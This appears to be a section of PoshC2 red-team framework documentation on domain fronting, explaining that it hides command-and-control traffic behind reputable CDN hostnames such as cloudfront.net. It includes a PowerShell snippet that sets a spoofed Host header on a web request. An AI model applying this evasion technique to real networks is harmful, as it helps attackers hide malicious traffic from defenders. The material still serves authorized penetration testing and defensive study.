Domain Fronting 
###################
PoshC2 can now use domain fronting for comms. There is a caveat to this; the host must have .NET v4.0.30319 installed and usable to the PowerShell instance. However, if the host does not have this version of the CLR installed it will default back to the underlying CDN hostname, for example cloudfront.net or azureedge.net. The way we perform domain fronting in PoshC2 is by adding the Host header to the web requests.

This is a much stealthier option for comms as you can utilise hostnames with better reputation without needing to buy new domains and obtain reputation yourself. There are many examples of these on the Internet, but as a proof of concept this example uses "d0.awsstatic.com".

.. code-block:: powershell

	$wc = New-Object System.Net.WebClient;
	$wc.Headers.Add("Host","example.cloudfront.net")
	$wc.DownloadString("d0.awsstatic.com")
